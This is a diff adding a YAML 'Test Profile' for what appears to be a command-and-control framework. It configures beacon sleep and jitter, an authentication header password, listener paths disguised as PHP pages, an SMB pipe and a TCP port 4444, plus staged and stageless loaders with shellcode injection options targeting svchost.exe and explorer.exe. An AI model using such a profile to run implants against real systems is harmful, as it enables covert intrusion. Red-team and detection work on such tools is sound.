@@ -1,0 +1,93 @@
+################## About ##################
+Name: Test
+Description: "Test Profile"
+
+################## Networking ##################
+Http:
+  Ip: "127.0.0.1"
+  Port: 8080
+  Tls: false
+  Sleep: 2
+  Jitter: 1
+  #UserAgent: ...
+  PasswdHeader: X-IronHelm
+  Passwd: HelmOfIron
+  MetadataHeader: Authorization
+  MetadataValue: "Bearer " # keep trailing space
+  #ServerHeaders:           # !!! Need to string.split() each header to get header/value when setting in Castle !!!
+  #  - "X-Header1 Value1"
+  #  - "X-Header2 Value2" 
+  #ClientHeaders:           # !!! Need to string.split() each header to get header/value when setting in Knight !!!
+  #  - "X-Header1 Value1"  
+  #  - "X-Header2 Value2" 
+  GetPaths:
+    - /index.php
+    - /home.php
+  PostPaths:
+    - /submit.php
+    - /general.php
+
+#WebSocket
+
+#QUIC
+
+SMB:
+  Pipename: ironhelm
+
+TCP:
+  Loopback: true
+  Port: 4444
+
+################## Payload ##################
+SharedArsenal:
+  ResourceName: SharedArsenal.dll
+#   # PI_kernel32, DI_kernel32, DI_ntdll, DI_Syscalls
+#   #InterOp: PI_kernel32
+#   #ReMap:
+#   #- ntdll.dll
+#   #- kernel32.dll
+#   #Obfuscate: true
+
+MB_Staged:
+  # EXE, DLL
+  #CompType: EXE
+  # HttpUri, WebSocketUri, QUICUri
+  Get: HttpUri
+  GetUri: 'http://127.0.0.1:8000/a'
+  # None, Base63, Aes256, Aes128
+  Format: None
+  # ExecuteAssembly, Shellcode_SelfInject, Shellcode_RemoteInject, Shellcode_SpawnInject, DllExported_RemoteInject
+  Execute: ExecuteAssembly
+  #SpawnInjectTarget: ...      # Only applies to Shellcode_SpawnInject
+  #RemoteInjectTargets:        # Only applies to Shellcode_RemoteInject & DllExported_RemoteInject
+  #  - svchost.exe  
+  #  - explorer.exe
+  # None, PowerShell, Cmd
+  CleanUp: None
+
+MB_Stageless:
+  # EXE, DLL
+  #CompType: EXE
+  # Stageless_Resource, Stageless_Blob, Stageless_File
+  Get: File
+  GetName: 'C:\\Users\\vlcak\\Desktop\\Test\\Knight_Egress.exe'
+  # None, Base64, Aes256, Aes128
+  Format: None
+  # Execute_ExecuteAssembly, Execute_Shellcode_SelfInject, Execute_Shellcode_RemoteInject, Execute_Shellcode_SpawnInject, Execute_DllExported_RemoteInject
+  Execute: ExecuteAssembly
+  #SpawnInjectTarget: ...      # Only applies to Shellcode_SpawnInject
+  #RemoteInjectTargets:        # Only applies to Shellcode_RemoteInject & DllExported_RemoteInject
+  # - svchost.exe  
+  # - explorer.exe
+  # None, PowerShell, Cmd
+  CleanUp: None
+
+#Knight:
+  #CompType: EXE
+  #EncryptionAlgo: enum {None/AES_128/AES_192/AES_256/RC4}    
+  #SpawnInjectTarget: "C:\\..\\notepad.exe"
+
+################## Compile ##################
+#Compile:
+  #Obfuscate: true
+  #CodeSign:  ?
